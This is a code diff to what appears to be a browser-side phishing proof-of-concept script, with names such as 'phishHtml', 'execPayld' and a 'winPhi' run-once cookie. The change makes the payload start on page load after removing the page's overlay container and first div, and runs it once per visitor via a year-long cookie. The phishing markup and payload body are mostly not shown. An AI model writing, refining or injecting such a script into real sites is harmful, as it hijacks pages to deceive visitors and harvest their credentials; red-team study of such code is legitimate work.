@@ -1,5 +1,8 @@
-document.getElementsByClassName('cdk-overlay-container')[0].remove();
-document.getElementsByTagName('div')[0].remove();
+window.addEventListener('load', function() {
+  document.getElementsByClassName('cdk-overlay-container')[0].remove();
+  document.getElementsByTagName('div')[0].remove();
+  startPoC();
+});
 let runOnce = false;
 const phishHtml = `
 <style>
@@ -88,16 +91,18 @@ function execPayld() {
     event.preventDefault();
   });
 }
-// [CASE] RUN (PAYLOAD) ONCE ENABLED AND COOKIE NOT SET => SET RUNONCE COOKIE AND EXECUTE PAYLOAD
-if ((runOnce) && !(/^(.*;)?\s*winPhi\s*=\s*[^;]/.test(document.cookie))) {
-  let cookExp = new Date();
-  cookExp.setFullYear(cookExp.getFullYear() + 1);
-  let cook = 'winPhi=true; path=/; expires=' + cookExp.toUTCString();
-  document.cookie = cook;
-  execPayld();
-}
-// [CASE] RUN (PAYLOAD) ONCE NOT ENABLED => EXECUTE PAYLOAD
-if (!runOnce) {
-  execPayld();
+function startPoC() {
+  // [CASE] RUN (PAYLOAD) ONCE ENABLED AND COOKIE NOT SET => SET RUNONCE COOKIE AND EXECUTE PAYLOAD
+  if ((runOnce) && !(/^(.*;)?\s*winPhi\s*=\s*[^;]/.test(document.cookie))) {
+    let cookExp = new Date();
+    cookExp.setFullYear(cookExp.getFullYear() + 1);
+    let cook = 'winPhi=true; path=/; expires=' + cookExp.toUTCString();
+    document.cookie = cook;
+    execPayld();
+  }
+  // [CASE] RUN (PAYLOAD) ONCE NOT ENABLED => EXECUTE PAYLOAD
+  if (!runOnce) {
+    execPayld();
+  }
 }
 // EoF
